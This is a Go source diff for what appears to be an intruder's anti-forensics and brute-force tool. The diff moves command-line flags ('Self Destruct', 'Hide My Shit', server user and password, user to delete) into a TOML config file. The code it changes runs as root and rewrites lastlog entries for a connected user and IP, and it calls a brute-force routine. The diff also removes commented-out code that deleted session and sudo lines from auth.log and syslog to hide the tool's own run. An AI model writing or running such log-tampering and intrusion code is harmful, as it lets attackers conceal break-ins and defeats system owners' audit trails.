@@ -5,6 +5,7 @@ import (
 	"encoding/binary"
 	"flag"
 	"fmt"
+	"log"
 	"os"
 	"reflect"
 	"slices"
@@ -18,6 +19,8 @@ import (
 	utmp "test/UTMP"
 	vars "test/VARS"
 	"time"
+
+	"github.com/BurntSushi/toml"
 )
 
 // When I wrote this Code
@@ -59,24 +62,22 @@ import (
 
 // back here againe Fuck you  need sleep
 
+// After vacations still tring to fix this shitty mess.
+
 var indexToDel int64
 var count int64
 var ProxyIp [16]byte
 var play bool = true
+var conf vars.Config
 
 func init() {
-	// Initialize flags
 
-	flag.BoolVar(&vars.Destr, "d", false, "Self Destruct")
-	flag.BoolVar(&vars.Combo, "c", false, "Combo Entry")
-	flag.BoolVar(&vars.HideMe, "hm", true, "Hide My Shit")
-	flag.StringVar(&vars.BrFile, "f", "", "Data File")
-	// flag.StringVar(&vars.Host, "h", "192.168.23.23", "Server Host")
-	flag.StringVar(&vars.Port, "p", "", "Server Port")
-	flag.StringVar(&vars.User, "u", "", "Server Username")
-	flag.StringVar(&vars.Pass, "pa", "", "Server Pass")
-	flag.StringVar(&vars.ConnectedUser, "cu", "ubuntu", "Connected User To Delete")
-	flag.IntVar(&vars.Threads, "t", 3, "Threads")
+	if _, err := toml.DecodeFile("config.toml", &conf); err != nil {
+		log.Fatal(err)
+	}
+	if false { //<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,
+		os.Remove("config.toml")
+	}
 
 }
 
@@ -88,7 +89,7 @@ func main() {
 	// time.Sleep(30 * time.Second)
 
 	if true {
-		if vars.HideMe {
+		if conf.Flags.Hideme {
 
 			euid := os.Geteuid()
 			if euid == 0 {
@@ -109,7 +110,7 @@ func main() {
 
 				// ConvertIPToBytearray(&connectedData.IP)
 
-				lastlog.ChangeLastLog(&connectedData.IP, &dataToInfl, &vars.ConnectedUser)
+				lastlog.ChangeLastLog(&connectedData.IP, &dataToInfl, &conf.Flags.ConnectedUser)
 				// /////////////////////////////////////////////////////////////////////////////
 				// sessionStart := int(dataToInfl.Time.Sec)
 				// sessionStop := int(dataToInfl.TimeEnd.Sec)
@@ -125,7 +126,7 @@ func main() {
 			}
 		}
 		if false {
-			bf.Bf()
+			bf.Bf(conf)
 		}
 	}
 
@@ -271,25 +272,3 @@ func deleteBytesFromFile(filePath string, start int64, count int64) error { //wt
 
 	return nil
 }
-
-// if false {
-// check.Check("Delete Auth Log ", err)
-
-// patternDeleteSession := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:|New session %s)`, start[1], stop[1], sessionID, sessionID, sessionID)
-// err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSession, vars.SYSLOG)
-// if err != nil {
-// 	fmt.Println("Errpr", err)
-// }
-// ex, err := os.Executable()
-// if err != nil {
-// 	panic(err)
-// }
-
-// exPath := filepath.Dir(ex)
-// patternDeleteSudoExec := fmt.Sprintf(`^(.*PWD=%s).*(%s)`, exPath, filepath.Base(os.Args[0]))
-// check.Check("Error on delete Line Auth Log", err)
-// err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSudoExec, vars.AUTH_LOG)
-// if err != nil {
-// 	fmt.Println(err)
-// }
-// }
